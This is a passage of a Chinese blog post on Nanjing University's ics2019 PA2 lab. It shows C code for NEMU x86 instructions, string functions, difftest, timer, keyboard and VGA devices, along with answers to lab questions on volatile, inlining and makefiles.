((cpu.eax&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>) cpu.edx|=<span class="hljs-number">0xffffffff</span>;    <span class="hljs-keyword">else</span> cpu.edx&amp;=<span class="hljs-number">0</span>;  }  <span class="hljs-built_in">print_asm</span>(decinfo.isa.is_operand_size_16 ? <span class="hljs-string">"cwtl"</span> : <span class="hljs-string">"cltd"</span>);}<span class="hljs-built_in">make_EHelper</span>(cwtl) {  <span class="hljs-keyword">if</span> (decinfo.isa.is_operand_size_16) {    <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">7</span>)&amp;<span class="hljs-number">1</span>) cpu.eax|=<span class="hljs-number">0x0000ff00</span>;    <span class="hljs-keyword">else</span> cpu.eax&amp;=<span class="hljs-number">0xffff00ff</span>;  }  <span class="hljs-keyword">else</span> {    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">1</span>) cpu.eax|=<span class="hljs-number">0xffff0000</span>;    <span class="hljs-keyword">else</span> cpu.eax&amp;=<span class="hljs-number">0x0000ffff</span>;  }  <span class="hljs-built_in">print_asm</span>(decinfo.isa.is_operand_size_16 ? <span class="hljs-string">"cbtw"</span> : <span class="hljs-string">"cwtl"</span>);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211021325565_511_20230523225625599245_402_image-20230418034230992.png" alt="image-20230418034230992"><figcaption aria-hidden="true">image-20230418034230992</figcaption></figure><p>还差两个</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211022715667_250_20230523225630693991_523_image-20230418034312229.png" alt="image-20230418034312229"><figcaption aria-hidden="true">image-20230418034312229</figcaption></figure><p>recursion，call_rm没实现。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211023566968_525_20230523225633722246_665_image-20230418034508931.png" alt="image-20230418034508931"><figcaption aria-hidden="true">image-20230418034508931</figcaption></figure><p>手册上call写的很长，只需要关注r/m部分就可以了</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211024660721_703_20230523225635958260_687_image-20230418034759314.png" alt="image-20230418034759314"><figcaption aria-hidden="true">image-20230418034759314</figcaption></figure><p>对应实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7lgg84lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-7lgg84lluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(call_rm) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_li</span>(&amp;s0,id_dest-&gt;val);  <span class="hljs-built_in">rtl_mv</span>(&amp;decinfo.jmp_pc,&amp;s0);  <span class="hljs-comment">//decinfo.is_jmp=1;</span>  <span class="hljs-built_in">rtl_push</span>(pc);  <span class="hljs-built_in">rtl_j</span>(decinfo.jmp_pc);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"call *%s"</span>, id_dest-&gt;str);}</code></pre></div></div><p>这时候发现只有<code>string</code>过不了了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211026175881_831_20230523225639988445_167_image-20230418180917748.png" alt="image-20230418180917748"><figcaption aria-hidden="true">image-20230418180917748</figcaption></figure><p>一开始看到运行到了bad指令以为是自己跳转指令实现的有问题，回去检查了一遍没发现毛病，看指导书才发现是自己少做了东西。然后2020版的文档这个位置就挨着不要以为有TDDO才需要实现的免责声明。多少有点挑衅了。但又不能说什么，谁让我没好好看文档。。。</p><p>按照指导书提示，要完成<code>string.c</code>中列出的字符串处理函数才能通过这个样例。看源代码实现下面三个函数就可以了。我们只需要通过直接操作字符来完成库函数本应有的功能即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mv689llluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-mv689llluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">strncpy</span><span class="hljs-params">(<span class="hljs-type">char</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* src, <span class="hljs-type">size_t</span> n)</span> </span>{<span class="hljs-type">char</span>* pd=dst;<span class="hljs-keyword">while</span> (n&gt;<span class="hljs-number">0</span>&amp;&amp;*src!=<span class="hljs-string">'\0'</span>) --n,*pd=*src,++pd,++src;<span class="hljs-keyword">while</span> (n&gt;<span class="hljs-number">0</span>) --n,*pd=<span class="hljs-string">'\0'</span>,++pd;<span class="hljs-keyword">return</span> dst;}<span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">strcat</span><span class="hljs-params">(<span class="hljs-type">char</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* src)</span> </span>{<span class="hljs-type">char</span>* pd=dst;<span class="hljs-keyword">while</span> (*pd!=<span class="hljs-string">'\0'</span>) ++pd;<span class="hljs-keyword">while</span> (*src!=<span class="hljs-string">'\0'</span>) *pd=*src,++pd,++src;*pd=<span class="hljs-string">'\0'</span>;<span class="hljs-keyword">return</span> dst;}<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* s2)</span> </span>{<span class="hljs-keyword">while</span> (*s1!=<span class="hljs-string">'\0'</span>&amp;&amp;*s2!=<span class="hljs-string">'\0'</span>&amp;&amp;*s1==*s2) ++s1,++s2;<span class="hljs-keyword">if</span> (*s1&gt;*s2) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*s1&lt;*s2) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>另外<code>sprintf</code>也是一样的单例。网上有很多参考，如<a href="http://blog.chinaunix.net/uid-29073321-id-5557641.html">这个</a>。就不展开了。</p><p>然后发现neg没实现。实现了就好。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211027295891_667_20230523225645128900_949_image-20230418182437373.png" alt="image-20230418182437373"><figcaption aria-hidden="true">image-20230418182437373</figcaption></figure><p>顺利AP。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211028239443_674_20230523225647440928_407_image-20230418182631614.png" alt="image-20230418182631614" style="zoom: 50%;"></p><h4 id="问题-1">问题</h4><h6 id="为什么要有am">为什么要有AM？</h6><p>AM的主要目的是程序和架构解耦，也就是屏蔽底层指令集架构的差异，让程序不必关心底层的架构。而操作系存在的目的主要是控制多道程序运行调度，，并提供文件访问，网络，输入输出等方便调用的接口。从功能上AM和OS有所重叠，但在抽象层次上AM是处于操作系统下层的。</p><h6 id="堆和栈在哪里">堆和栈在哪里？</h6><p>这个问题2019没有，看了学校手册才知道。</p><p>堆和栈在内存里。</p><p>为什么堆和栈的内容没有放入可执行文件里面?那程序运行时刻用到的堆和栈又是怎么来的？</p><p>因为堆和栈的大小是在运行时确定的，它们的内容无法在编译时被包含在可执行文件中。相反，它们的大小和位置由操作系统根据程序的需要在运行时进行动态分配和管理。</p><h6 id="指令名对照">指令名对照</h6><p>对于x86手册附录有opcode-map，直接根据指令的opcode查询即可，不必非得通过名称查询。这建立在指令名本身只是方便记忆的助记符，二手册对opcode的指令功能和解码方式进行的约定。</p><h3 id="difftest">difftest</h3><h4 id="任务-2">任务</h4><p><code>difftest</code>的实现我们只需要实现检查寄存器的环节即可。</p><p><code>nemu/src/isa/mips32/diff-test.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1kw6oslluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-1kw6oslluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isa_difftest_checkregs</span><span class="hljs-params">(CPU_state *ref_r, <span class="hljs-type">vaddr_t</span> pc)</span> </span>{  <span class="hljs-keyword">if</span> ((*ref_r).eax!=cpu.eax||(*ref_r).ecx!=cpu.ecx||(*ref_r).edx!=cpu.edx||(*ref_r).ebx!=cpu.ebx||(*ref_r).esp!=cpu.esp||(*ref_r).ebp!=cpu.ebp||(*ref_r).esi!=cpu.esi||(*ref_r).edi!=cpu.edi||(*ref_r).pc!=cpu.pc) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}<span class="hljs-function">xxxxxxxxxx&nbsp;<span class="hljs-type">bool</span> <span class="hljs-title">isa_difftest_checkregs</span><span class="hljs-params">(CPU_state *ref_r, <span class="hljs-type">vaddr_t</span> pc)</span> </span>{ &nbsp;<span class="hljs-keyword">if</span> ((*ref_r).eax!=cpu.eax||(*ref_r).ecx!=cpu.ecx    ||(*ref_r).edx!=cpu.edx||(*ref_r).ebx!=cpu.ebx    ||(*ref_r).esp!=cpu.esp||(*ref_r).ebp!=cpu.ebp    ||(*ref_r).esi!=cpu.esi||(*ref_r).edi!=cpu.edi    ||(*ref_r).pc!=cpu.pc) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &nbsp;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}nemu/src/isa/mips32/diff-test.c</code></pre></div></div><h4 id="问题-2">问题</h4><h6 id="api约定">API约定</h6><p>实验指导书中提到，在介绍API约定的时候,提到了寄存器状态<code>r</code>需要把寄存器按照某种顺序排列.<code>qemu-diff</code>作为REF, 已经满足API的这一约束. 让我们RTFSC,从中找出这一顺序, 并检查你的NEMU实现是否已经满足约束.</p><p>我们从宏定义入手，看开启<code>difftest</code>时<code>nemu</code>执行了哪些步骤，指导书其实也有阐述。</p><p>调用<code>init_difftest()</code>，初始化，其中包括从动态库中读取API的符号</p><p><code>nemu/src/monitor/diff-test/diff-test.c</code>-<code>void init_difftest</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211029323323_152_20230523225651167723_797_image-20230417234512940.png" alt="image-20230417234512940"><figcaption aria-hidden="true">image-20230417234512940</figcaption></figure><p>给<code>ref_difftest_setregs</code>传入的参数是cpu。在PA1中我们完成了这个结构体，寄存器顺序如下:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211030355455_952_20230523225653391160_373_image-20230417235814052.png" alt="image-20230417235814052"><figcaption aria-hidden="true">image-20230417235814052</figcaption></figure><p>再看调用的API:</p><p><code>nemu/tools/qemu-diff/src/diff-test.c</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211031585613_677_20230523225657431948_677_image-20230417234630438.png" alt="image-20230417234630438"><figcaption aria-hidden="true">image-20230417234630438</figcaption></figure><p><code>nemu/tools/qemu-diff/src/isa/x86/include/isa.h</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211032473395_332_20230523225701591453_145_image-20230417232210081.png" alt="image-20230417232210081"><figcaption aria-hidden="true">image-20230417232210081</figcaption></figure><p>可以看到顺序是符合约定的。其中<code>array</code>是存<code>gdb</code>通信的字符串消息的。</p><h6 id="匪夷所思的qemu行为">匪夷所思的QEMU行为</h6><p>这个确实不了解，不过根据指导书，x86也没有这种行为。</p><h6 id="捕捉死循环">捕捉死循环</h6><p>如果我们是像Difftest一样在实现的过程检验实现是否正确(在这次实验中死循环和badinstruction引起的问题确实不好定位，difftest也无能为力，定位到的指令离实际出现的指令十万八千里。只能根据git记录依次检查自己实现的指令可能存在的问题。)，可以采用在naive上记录动态指令执行的指令数，然后执行的时候如果超过了这个指令数就终止。而作为模拟器去检查死循环，可以采用静态代码分析的方式进行。执行起来的时候检查比较难，因为比如设置阈值，其实不知道是程序死循环了还是真的想执行这么多次。</p><h2 id="三阶段">三阶段</h2><h3 id="任务-3">任务</h3><p>别忘了把HAS_IOE打开。</p><h3 id="串口">串口</h3><p>选x86有福了。还要实现<code>in</code>,<code>out</code>指令。还好这个也不难，在它们的执行辅助函数中分别调用<code>pio_read_[l|w|b]()</code>和<code>pio_write_[l|w|b]()</code>函数即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wj5s6hlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wj5s6hlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(in) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">4</span>) s0=<span class="hljs-built_in">pio_read_l</span>(id_src-&gt;val);  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">2</span>) s0=<span class="hljs-built_in">pio_read_w</span>(id_src-&gt;val);  <span class="hljs-keyword">else</span> s0=<span class="hljs-built_in">pio_read_b</span>(id_src-&gt;val);  <span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);  <span class="hljs-built_in">print_asm_template2</span>(in);}<span class="hljs-built_in">make_EHelper</span>(out) {<span class="hljs-comment">//  TODO();</span><span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">4</span>)  <span class="hljs-built_in">pio_write_l</span>(id_dest-&gt;val,id_src-&gt;val);<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">2</span>)  <span class="hljs-built_in">pio_write_w</span>(id_dest-&gt;val,id_src-&gt;val);<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">1</span>) <span class="hljs-built_in">pio_write_b</span>(id_dest-&gt;val,id_src-&gt;val);<span class="hljs-keyword">else</span> <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);<span class="hljs-built_in">print_asm_template2</span>(out);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211033387892_259_20230523225703718139_454_image-20230418190251286.png" alt="image-20230418190251286"><figcaption aria-hidden="true">image-20230418190251286</figcaption></figure><p>看手册，果然是IN，OUT指令。在opcode_table里面补上即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211034316175_681_20230523225706985852_641_image-20230418190440852.png" alt="image-20230418190440852"><figcaption aria-hidden="true">image-20230418190440852</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211035280904_873_20230523225709250708_350_image-20230418192239874.png" alt="image-20230418192239874" width="67%" height="67%"></p><h3 id="时钟">时钟</h3><p>这个部分看了半天没看明白要干什么，查阅网上资料才知道怎么做:</p><p>初始化时通过inl(RTC_ADDR)获取初始时间boot_time，随后uptime时同样读取时间，相减作为uptime-&gt;lo。</p><p>在<code>_DEVREG_TIMER_UPTIME</code>case里面:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ak8ibzlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ak8ibzlluwpkzu"><pre><code class="hljs C++">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tt=(<span class="hljs-built_in">inl</span>(RTC_ADDR)-init_tim);<span class="hljs-comment">//      printf("%d\n",tt);</span>      uptime-&gt;hi = <span class="hljs-number">0</span>;      uptime-&gt;lo = tt;</code></pre></div></div><p>后面没实现的初始化函数:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hy957olluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-hy957olluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">void</span> __am_timer_init() {init_tim=<span class="hljs-built_in">inl</span>(RTC_ADDR);}</code></pre></div></div><p>当然要增加一个静态全局变量<code>init_tim</code>把初始时间记下来。</p><p>至于怎么跑，<code>make ARCH=native mainargs=H run</code>可以看到:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211036423311_503_20230523225713545364_139_image-20230418194525024.png" alt="image-20230418194525024"><figcaption aria-hidden="true">image-20230418194525024</figcaption></figure><p>因此可以<code>make ARCH=x86-nemu mainargs=t run</code>，当然<code>naive</code>也是可以对照着看的。</p><p>一开始发现进入之后不打印，一直死循环，发现是没有实现<code>printf</code>。补上就可以了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211037278159_262_20230523225716611404_456_image-20230418194930929.png" alt="image-20230418194930929"><figcaption aria-hidden="true">image-20230418194930929</figcaption></figure><p>跑分，随便跑了一个，现在性能还是比较拉胯。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211039337832_998_20230523225720787415_925_image-20230418201037377.png" alt="image-20230418201037377"><figcaption aria-hidden="true">image-20230418201037377</figcaption></figure><h4 id="键盘">键盘</h4><p>和时钟相似。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gu7trzlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-gu7trzlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> _DEVREG_INPUT_KBD:{  _DEV_INPUT_KBD_t *kbd = (_DEV_INPUT_KBD_t *)buf;  <span class="hljs-type">uint32_t</span> code_key = <span class="hljs-built_in">inl</span>(KBD_ADDR);  <span class="hljs-keyword">if</span> (code_key == _KEY_NONE)  {    kbd-&gt;keydown = <span class="hljs-number">0</span>;    kbd-&gt;keycode = _KEY_NONE;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> (code_key &amp; <span class="hljs-number">0x8000</span>)      kbd-&gt;keydown = <span class="hljs-number">1</span>;    <span class="hljs-keyword">else</span>      kbd-&gt;keydown = <span class="hljs-number">0</span>;    kbd-&gt;keycode = (code_key);  }  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sizeof</span>(_DEV_INPUT_KBD_t);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211040355929_180_20230523225723117288_548_image-20230418202105754.png" alt="image-20230418202105754"><figcaption aria-hidden="true">image-20230418202105754</figcaption></figure><h3 id="vga">VGA</h3><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vqejgslluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-vqejgslluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">vga_io_handler</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">int</span> len, <span class="hljs-type">bool</span> is_write)</span> </span>{  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> call `update_screen()` when writing to the sync register</span>  <span class="hljs-comment">//TODO();</span>  <span class="hljs-keyword">if</span> (is_write)  {    <span class="hljs-built_in">update_screen</span>();  }}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-efzegnlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-efzegnlluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">size_t</span> __am_video_write(<span class="hljs-type">uintptr_t</span> reg, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size){  <span class="hljs-keyword">switch</span> (reg)  {  <span class="hljs-keyword">case</span> _DEVREG_VIDEO_FBCTL:  {    _DEV_VIDEO_FBCTL_t *ctl = (_DEV_VIDEO_FBCTL_t *)buf;    <span class="hljs-type">uint32_t</span> p = <span class="hljs-number">0</span>;    <span class="hljs-type">uint32_t</span> *ff;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = ctl-&gt;y; j &lt; ctl-&gt;y + ctl-&gt;h; ++j)      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = ctl-&gt;x; i &lt; ctl-&gt;x + ctl-&gt;w; ++i)      {        ff = (<span class="hljs-type">uint32_t</span> *)(<span class="hljs-type">uintptr_t</span>)(FB_ADDR) + (j * <span class="hljs-number">400</span>);        ff[i] = ctl-&gt;pixels[p];        ++p;      }    <span class="hljs-keyword">if</span> (ctl-&gt;sync)    {      <span class="hljs-built_in">outl</span>(SYNC_ADDR, <span class="hljs-number">0</span>);    }    <span class="hljs-keyword">return</span> size;  }  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-type">void</span> __am_vga_init(){  <span class="hljs-type">int</span> i;  <span class="hljs-type">int</span> size = <span class="hljs-built_in">screen_width</span>() * <span class="hljs-built_in">screen_height</span>();  <span class="hljs-type">uint32_t</span> *fb = (<span class="hljs-type">uint32_t</span> *)(<span class="hljs-type">uintptr_t</span>)FB_ADDR;  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size; i++)    fb[i] = i;  <span class="hljs-built_in">draw_sync</span>();}![image<span class="hljs-number">-20230418210820936</span>](https:<span class="hljs-comment">//raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211041560535_570_20230523225728354796_263_image-20230418210820936.png)</span></code></pre></div></div><h4 id="问题-3">问题</h4><h6 id="volitle关键字">volitle关键字</h6><p>volitle关键字的基本含义是编译后的程序每次需要存储或读取这个变量的时候，告诉编译器对该变量不做优化，都会直接从变量内存地址中读取数据，从而可以提供对特殊地址的稳定访问。</p><p>参见<a href="https://zhuanlan.zhihu.com/p/343688629">这里</a></p><p>文中的例子便是手册中提及到的情形:</p><p>假设要对一个设备进行初始化，此设备的某一个寄存器为0x8049000</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0om3a4lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-0om3a4lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span></span>{<span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *p=(<span class="hljs-type">void</span> *)<span class="hljs-number">0x8049000</span>; *p=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(*p !=<span class="hljs-number">0xff</span>);*p=<span class="hljs-number">0x33</span>;*p=<span class="hljs-number">0x34</span>;*p=<span class="hljs-number">0x86</span>;}</code></pre></div></div><p>正常先循环读后写，一切正常。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211042853070_743_20230523225733159116_222_image-20230418224522431.png" alt="image-20230418224522431"><figcaption aria-hidden="true">image-20230418224522431</figcaption></figure><p>去掉volatile:</p><p>经过编译器优化后，编译器认为指针指向的内容都是0了，下面while肯定是一个死循环，就自己jmp自己了。表现在设备上，就是一直在读，写不进去，就出问题了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211043774455_612_20230523225737654532_187_image-20230418224713003.png" alt="image-20230418224713003"><figcaption aria-hidden="true">image-20230418224713003</figcaption></figure><h6 id="如何检测多个键同时被按下">如何检测多个键同时被按下？</h6><p>键码相或即可。</p><h3 id="必答题">必答题</h3><h6 id="整理一条指令的运行过程">整理一条指令的运行过程</h6><p>这个问题2018版没有，事实上PA2第一部分指令系统的课件说的也非常详细。</p><h6 id="编译与链接">编译与链接</h6><p><a href="https://blog.csdn.net/huanghui167/article/details/41346663">参考</a></p><p>inline关键字实际上表示建议内联，gcc中O0优化时是不内联的。所以在头文件中用inline时务必加入static。为了确保内联，头文件中用 inline 时务必加入 static，否则当 inline不内联时就和普通函数在头文件中定义一样，当多个 c文件包含时就会重定义。加入 static 后代码健壮性高，如果只是用 inline时编译器都内联了，那两者的实际效果是一样的。</p><p>在我的环境下，去掉<code>static</code>和去掉<code>inline</code>是没有影响的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211044662641_241_20230523225741529190_435_image-20230418165948224.png" alt="image-20230418165948224"><figcaption aria-hidden="true">image-20230418165948224</figcaption></figure><p>但是都去掉，就报错了：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211046474774_474_20230523230801541908_353_image-20230418171100319.png" alt="image-20230418171100319"><figcaption aria-hidden="true">image-20230418171100319</figcaption></figure><p>因为头文件会被许多文件引用所以如果去掉staticinline,这个函数就会被多次定义，在链接的时候会报错。</p><p>重新编译NEMU.请问重新编译后的NEMU含有38个<code>dummy</code>变量的实体(统计得到的加上<code>common.h</code>里的)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211047556012_298_20230523230807076612_975_image-20230418172006341.png" alt="image-20230418172006341"><figcaption aria-hidden="true">image-20230418172006341</figcaption></figure><p><code>nemu/include/debug.h</code>加了之后没变化(虽然理论上会多)</p><p>加上等于0，报错。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211048550534_453_20230523230813184695_469_image-20230418180715096.png" alt="image-20230418180715096"><figcaption aria-hidden="true">image-20230418180715096</figcaption></figure><p>课上讲过，在C语言中只声明不初始化是一种弱定义，当声明多个同名同类型的变量时，编译不会报错，但是到了链接阶段，由于全是弱符号，链接器会随便选择一个。但是，有了初始化之后之后就不一样了，这变成了强定义，编译器无法忽略。</p><h6 id="makefile执行过程">makefile执行过程</h6><p>之前操作系统折磨过的一次makefile又回来折磨人了。 即便当时写了<a href="https://lunaticsky-tql.github.io/posts/23557/">makefile急速入门</a>，makefile这个东西不得不说和shell脚本一样，语法独具其风格，简练强大但可读性也不敢恭维。</p><p>我们输入make默认生成NEMU的二进制文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-umx2wxlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-umx2wxlluwpkzu"><pre><code class="hljs makefile"><span class="hljs-section">app: <span class="hljs-variable">$(BINARY)</span></span></code></pre></div></div><p>再去看<code>$(BINARY)</code>的依赖:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tfgygvlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-tfgygvlluwpkzu"><pre><code class="hljs makefile"><span class="hljs-variable">$(BINARY)</span>: <span class="hljs-variable">$(OBJS)</span><span class="hljs-variable">$(<span class="hljs-built_in">call</span> git_commit, "compile")</span>@echo + LD <span class="hljs-variable">$@</span>@<span class="hljs-variable">$(LD)</span> -O2 -rdynamic <span class="hljs-variable">$(SO_LDLAGS)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> -lSDL2 -lreadline -ldl</code></pre></div></div><p>BINARY 依赖于 OBJS</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vcewehlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-vcewehlluwpkzu"><pre><code class="hljs C++">OBJS = $(SRCS:src/%.c=$(OBJ_DIR)/%.o)</code></pre></div></div><p>(var:a=b)，是将 var 变量中每一个单词后面的 a 替换为b。所以OBJS其实就是build 文件夹下的所有.o 文件</p><p>OBJ_DIR是前面定义了的构建路径目标</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" 